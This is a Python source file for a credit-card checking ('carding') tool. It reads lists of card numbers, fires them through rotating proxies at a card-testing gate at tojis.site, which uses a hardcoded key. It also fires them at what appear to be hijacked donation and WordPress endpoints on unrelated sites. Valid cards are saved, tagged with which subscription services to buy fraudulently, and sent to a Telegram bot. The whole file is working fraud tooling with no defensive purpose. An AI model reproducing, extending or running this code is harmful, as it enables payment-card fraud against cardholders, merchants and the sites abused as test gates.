import sys, os, time, random, requests, threading, re, uuid, base64, asyncio, json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote, unquote
from fake_useragent import UserAgent
from colorama import init, Fore, Style
from flask import Flask

# --- RENDER SERVER SETUP ---
app = Flask(__name__)
@app.route('/')
def health_check():
    return "Engine V30 Target-Master Running"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

init(autoreset=True)

class UltimateMasterV30:
    def __init__(self):
        self.lock = threading.Lock()
        self.is_killed = False
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        self.bot_token = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN") 
        self.chat_id = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")     
        
        self.proxies_list = self.load_proxies()
        self.mode = "Standard" 
        
        # --- ALL REQUESTED TARGETS ADDED ---
        self.targets = {
            "Telegram Premium": "https://fragment.com/stars",
            "Instagram/Meta": "https://accountscenter.instagram.com/payments/",
            "Snapchat+": "https://www.snapchat.com/plus",
            "Truecaller": "https://www.truecaller.com/premium",
            "Heroku": "https://dashboard.heroku.com/account/billing",
            "Amazon": "https://www.amazon.com/gp/your-account/",
            "YouTube Premium": "https://www.youtube.com/premium",
            "PlayStore": "https://play.google.com/store",
            "BGMI UC": "https://www.midasbuy.com"
        }

    def load_proxies(self):
        try:
            if os.path.exists("proxy.txt"):
                with open("proxy.txt", "r") as f:
                    return [line.strip() for line in f if line.strip()]
            return []
        except: return []

    def save_hit_to_file(self, cc_data):
        with self.lock:
            with open("hits.txt", "a") as f:
                f.write(f"{cc_data}\n")

    def get_proxy(self):
        if not self.proxies_list: return None
        proxy = random.choice(self.proxies_list)
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return {"http": f"http://{user}:{pwd}@{ip}:{port}", "https": f"http://{user}:{pwd}@{ip}:{port}"}
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def get_full_card_info(self, cc):
        try:
            bin_num = cc[:6]
            res = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5).json()
            level = res.get("type", "Unknown").upper()
            country_name = res.get('country', {}).get('name', '')
            
            # --- TARGET-SPECIFIC RECOMMENDATION ---
            best_for = "General Subscriptions"
            if "BUSINESS" in level or "CORPORATE" in level:
                best_for = "Heroku, Amazon & Cloud (High Limit)"
            elif "SIGNATURE" in level or "INFINITE" in level:
                best_for = "Telegram Premium, Stars & Instagram Sub"
            elif "PLATINUM" in level or "GOLD" in level:
                best_for = "Snapchat+, Truecaller & YouTube"
            
            return {
                "bank": res.get("bank", {}).get("name", "Unknown Bank"),
                "level": level,
                "brand": res.get("scheme", "Unknown").upper(),
                "country": f"{country_name} {res.get('country', {}).get('emoji', '🌐')}",
                "zip": "90001 (US)" if "United States" in country_name else "Manual",
                "best": best_for
            }
        except: 
            return {"bank": "Unknown", "level": "Unknown", "brand": "Unknown", "country": "Unknown", "zip": "N/A", "best": "All Targets"}

    def send_log(self, msg):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
            requests.post(url, json={"chat_id": self.chat_id, "text": msg, "parse_mode": "Markdown"}, timeout=10)
        except: pass

    def process_card(self, cc):
        if self.is_killed: return
        try:
            time.sleep(random.randint(2, 5))
            cc_clean = cc.replace(' ', '').strip()
            if not cc_clean: return
            
            srv_name = random.choice(list(self.targets.keys()))
            current_proxy = self.get_proxy()
            
            if self.mode == "PayPal":
                final_gate = f"https://binnaclehouse.org/donation/?amount=1&cc={cc_clean}"
            elif self.mode == "Authorize":
                final_gate = f"https://morgannasalchemy.com/wp-admin/admin-ajax.php?cc={cc_clean}"
            else:
                final_gate = f"{self.gate_base}?cc={cc_clean}&key={self.api_key}&sitye={quote(self.targets[srv_name])}"

            resp = requests.get(final_gate, headers={'User-Agent': self.ua.random}, proxies=current_proxy, timeout=50)
            
            if any(x in resp.text.lower() for x in ["succeeded", "charged", "success", "approved"]):
                info = self.get_full_card_info(cc_clean)
                self.save_hit_to_file(cc_clean)
                
                msg = (
                    f"🔥 *{self.mode} HIT FOUND* 🔥\n\n"
                    f"💳 *Card:* `{cc_clean}`\n"
                    f"🏦 *Bank:* {info['bank']}\n"
                    f"🏆 *Level:* {info['level']}\n"
                    f"📍 *Country:* {info['country']}\n"
                    f"📬 *Zip:* `{info['zip']}`\n\n"
                    f"🎯 *Best For:* `{info['best']}`\n"
                    f"✅ *Status:* LIVE"
                )
                self.send_log(msg)
                print(Fore.GREEN + f"[HIT] {cc_clean} | Advice: {info['best']}")
            else:
                print(Fore.RED + f"[DEC] {cc_clean[:16]}")
        except: pass

    def run(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        print(Fore.RED + "V30 ENGINE | TARGET-PRO & HYBRID LOADER")
        
        cards = []
        if os.path.exists("cards.txt"):
            with open("cards.txt", "r") as f:
                cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            print(Fore.CYAN + "\n[!] cards.txt empty. Paste cards and press Enter twice:")
            while True:
                line = input()
                if not line.strip(): break
                cards.append(line.strip())
        else:
            print(Fore.GREEN + f"[*] {len(cards)} cards loaded from cards.txt")

        if not cards: return

        print(Fore.YELLOW + "\n1. Standard | 2. PayPal | 3. Authorize")
        choice = input("Mode Select Karo: ")
        if choice == "2": self.mode = "PayPal"
        elif choice == "3": self.mode = "Authorize"

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(self.process_card, cards)

if __name__ == "__main__":
    threading.Thread(target=run_web_server, daemon=True).start()
    UltimateMasterV30().run()
